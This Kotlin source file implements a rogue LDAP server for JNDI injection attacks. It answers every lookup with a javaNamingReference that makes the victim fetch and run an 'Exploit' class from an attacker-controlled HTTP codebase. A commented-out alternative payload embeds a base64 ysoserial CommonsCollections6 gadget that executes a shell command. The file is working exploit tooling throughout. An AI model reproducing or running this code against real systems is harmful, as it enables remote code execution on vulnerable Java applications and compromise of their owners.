import com.unboundid.ldap.listener.InMemoryDirectoryServer
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig
import com.unboundid.ldap.listener.InMemoryListenerConfig
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor
import com.unboundid.ldap.sdk.Entry
import com.unboundid.ldap.sdk.LDAPException
import com.unboundid.ldap.sdk.LDAPResult
import com.unboundid.ldap.sdk.ResultCode
import java.net.InetAddress
import java.net.MalformedURLException
import java.net.URL
import javax.net.ServerSocketFactory
import javax.net.SocketFactory
import javax.net.ssl.SSLSocketFactory

object LDAPServer {
    private const val LDAP_BASE = "dc=example,dc=com"

    @Throws(Exception::class)
    fun launchLDAPServer(ldapPort: Int, httpServer: String, httpPort: Int) {
        try {
            val config = InMemoryDirectoryServerConfig(LDAP_BASE)
            config.setListenerConfigs(
                InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    ldapPort,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    SSLSocketFactory.getDefault() as SSLSocketFactory
                )
            )
            config.addInMemoryOperationInterceptor(OperationInterceptor(URL("http://$httpServer:$httpPort/#Exploit")))
            val ds = InMemoryDirectoryServer(config)
            println("Listening on 0.0.0.0:$ldapPort")
            ds.startListening()
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    @Throws(Exception::class)
    @JvmStatic
    fun main(args: Array<String>) {

        val httpServerIP = args.getOrElse(0) { "127.0.0.1" }
        val httpServerPort = Integer.valueOf(args.getOrElse(1) { "8080" })
        val ldapPort = Integer.valueOf(args.getOrElse(2) { "1389" })

        println("HttpServerAddress: $httpServerIP")
        println("HttpServerPort: $httpServerPort")
        println("LDAPServerPort: $ldapPort")

        CodebaseServer.launchCodebaseURLServer(httpServerIP, httpServerPort)
        launchLDAPServer(ldapPort, httpServerIP, httpServerPort)
    }

    private class OperationInterceptor(private val codebase: URL) : InMemoryOperationInterceptor() {
        override fun processSearchResult(result: InMemoryInterceptedSearchResult) {
            val base = result.request.baseDN
            val e = Entry(base)
            try {
                sendResult(result, base, e)
            } catch (e1: Exception) {
                e1.printStackTrace()
            }
        }

        @Throws(LDAPException::class, MalformedURLException::class)
        fun sendResult(result: InMemoryInterceptedSearchResult, base: String, e: Entry) {
            val url = URL(codebase, codebase.ref.replace('.', '/') + ".class")
            println("Send LDAP reference result for $base redirecting to $url")
            e.addAttribute("javaClassName", "foo")
            var cbstring = codebase.toString()
            val refPos = cbstring.indexOf('#')
            if (refPos > 0) {
                cbstring = cbstring.substring(0, refPos)
            }
            // Payload1: Return Reference Factory
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            // Payload1 end

            // Payload2: Return Serialized Gadget
            // java -jar ysoserial.jar CommonsCollections6 '/System/Applications/Calculator.app'|base64
//                e.addAttribute(
//                    "javaSerializedData", Base64.decode(
//                        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ABlvcGVuIC9BcHBsaWNhdGlvbnMvUVEuYXBwdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg="
//                    )
//                )

            // Payload2 end
            result.sendSearchEntry(e)
            result.result = LDAPResult(0, ResultCode.SUCCESS)
        }
    }
}